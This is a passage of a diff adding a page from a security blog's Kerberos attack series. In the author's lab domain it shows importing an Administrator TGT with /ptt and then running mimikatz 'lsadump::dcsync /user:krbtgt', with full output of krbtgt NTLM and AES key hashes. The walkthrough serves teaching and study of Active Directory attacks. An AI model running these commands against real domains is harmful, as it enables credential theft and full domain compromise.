+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local\Administrator'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">2810</span><span class="p">:</span><span class="n">e2e3</span><span class="p">:</span><span class="mi">6669</span><span class="p">:</span><span class="mi">29</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="p">:</span><span class="mi">88</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">TGT</span> <span class="n">request</span> <span class="n">successful</span><span class="err">!</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span><span class="p">):</span>
+
+      <span class="n">doIF7DCCBeigAwIBBaEDAgEWooIE8DCCBOxhggToMIIE5KADAgEFoRIbEEVMU1dJWENPUlAuTE9DQUyi</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="n">Z3QbEGVsc3dpeGNvcnAubG9jYWw</span><span class="o">=</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Ticket</span> <span class="n">successfully</span> <span class="n">imported</span><span class="err">!</span>
+
+  <span class="n">ServiceName</span>              <span class="p">:</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+  <span class="n">ServiceRealm</span>             <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
+  <span class="n">UserName</span>                 <span class="p">:</span>  <span class="n">Administrator</span> <span class="p">(</span><span class="n">NT_PRINCIPAL</span><span class="p">)</span>
+  <span class="n">UserRealm</span>                <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
+  <span class="n">StartTime</span>                <span class="p">:</span>  <span class="mi">12</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">3</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">11</span> <span class="n">PM</span>
+  <span class="n">EndTime</span>                  <span class="p">:</span>  <span class="mi">12</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">1</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">11</span> <span class="n">AM</span>
+  <span class="n">RenewTill</span>                <span class="p">:</span>  <span class="mi">1</span><span class="o">/</span><span class="mi">2</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">3</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">11</span> <span class="n">PM</span>
+  <span class="n">Flags</span>                    <span class="p">:</span>  <span class="n">name_canonicalize</span><span class="p">,</span> <span class="n">pre_authent</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">renewable</span><span class="p">,</span> <span class="n">forwardable</span>
+  <span class="n">KeyType</span>                  <span class="p">:</span>  <span class="n">rc4_hmac</span>
+  <span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="n">WED5Phcu4GPzWU1HwtwSog</span><span class="o">==</span>
+  <span class="n">ASREP</span> <span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span>
+</pre></div>
+<p>The <code>/ptt</code> parameter loads the ticket into the cache for future use. Now, let's perform a <code>DCSync</code> attack to extract the credentials of the <code>krbtgt</code> account:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span> <span class="s2">"lsadump::dcsync /user:krbtgt"</span> <span class="s2">"exit"</span>
+<span class="o">.</span>\<span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span> <span class="s2">"lsadump::dcsync /user:krbtgt"</span> <span class="s2">"exit"</span>
+
+  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span>
+ <span class="o">.</span><span class="c1">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
+ <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="c1">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+ <span class="s1">'## v ##'</span>       <span class="n">Vincent</span> <span class="n">LE</span> <span class="n">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="o">.</span><span class="n">letoux</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span> <span class="p">)</span>
+  <span class="s1">'#####'</span>        <span class="o">&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">pingcastle</span><span class="o">.</span><span class="n">com</span> <span class="o">/</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">mysmartlogon</span><span class="o">.</span><span class="n">com</span> <span class="o">***/</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c1"># lsadump::dcsync /user:krbtgt</span>
+<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">'elswixcorp.local'</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
+<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">'dc01.elswixcorp.local'</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
+<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">'krbtgt'</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
+<span class="p">[</span><span class="n">rpc</span><span class="p">]</span> <span class="n">Service</span>  <span class="p">:</span> <span class="n">ldap</span>
+<span class="p">[</span><span class="n">rpc</span><span class="p">]</span> <span class="n">AuthnSvc</span> <span class="p">:</span> <span class="n">GSS_NEGOTIATE</span> <span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+
+<span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">krbtgt</span>
+
+<span class="o">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="o">**</span>
+
+<span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">krbtgt</span>
+<span class="n">Account</span> <span class="n">Type</span>         <span class="p">:</span> <span class="mi">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
+<span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="mi">00000202</span> <span class="p">(</span> <span class="n">ACCOUNTDISABLE</span> <span class="n">NORMAL_ACCOUNT</span> <span class="p">)</span>
+<span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span> 
+<span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="mi">12</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">11</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">32</span> <span class="n">AM</span>
+<span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1672168468</span><span class="o">-</span><span class="mi">2738507895</span><span class="o">-</span><span class="mi">2086515240</span><span class="o">-</span><span class="mi">502</span>
+<span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="mi">502</span>
+
+<span class="n">Credentials</span><span class="p">:</span>
+  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">a88e9a174ee94f60f932fec548a84ccb</span>
+    <span class="n">ntlm</span><span class="o">-</span> <span class="mi">0</span><span class="p">:</span> <span class="n">a88e9a174ee94f60f932fec548a84ccb</span>
+    <span class="n">lm</span>  <span class="o">-</span> <span class="mi">0</span><span class="p">:</span> <span class="mi">6</span><span class="n">f5a5f80c2e31dbf2da599d5c3705d91</span>
+
+<span class="n">Supplemental</span> <span class="n">Credentials</span><span class="p">:</span>
+<span class="o">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">NTLM</span><span class="o">-</span><span class="n">Strong</span><span class="o">-</span><span class="n">NTOWF</span> <span class="o">*</span>
+    <span class="n">Random</span> <span class="n">Value</span> <span class="p">:</span> <span class="mi">67</span><span class="n">c5f0ed427922973aae6800acbd6e4a</span>
+
+<span class="o">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos</span><span class="o">-</span><span class="n">Newer</span><span class="o">-</span><span class="n">Keys</span> <span class="o">*</span>
+    <span class="n">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCALkrbtgt</span>
+    <span class="n">Default</span> <span class="n">Iterations</span> <span class="p">:</span> <span class="mi">4096</span>
+    <span class="n">Credentials</span>
+      <span class="n">aes256_hmac</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">bef0966dff97c062c510d879447c7266ac6ffade99d812dfa91c3b15749d3aa4</span>
+      <span class="n">aes128_hmac</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">bec46706fc7f841fa1123cbc7de78cad</span>
+      <span class="n">des_cbc_md5</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="mi">629194</span><span class="n">cdad08d9e5</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c1"># exit</span>
+<span class="n">Bye</span><span class="err">!</span>
+<span class="evrm">PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span>
+</pre></div>
+<p>As shown, the attack was successful, and we retrieved the <code>krbtgt</code> account credentials.</p><br/>
+<p>This concludes the article. You can find the conclusion in the <a href="Attacking-Kerberos.html">main document</a>.</p><br/>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
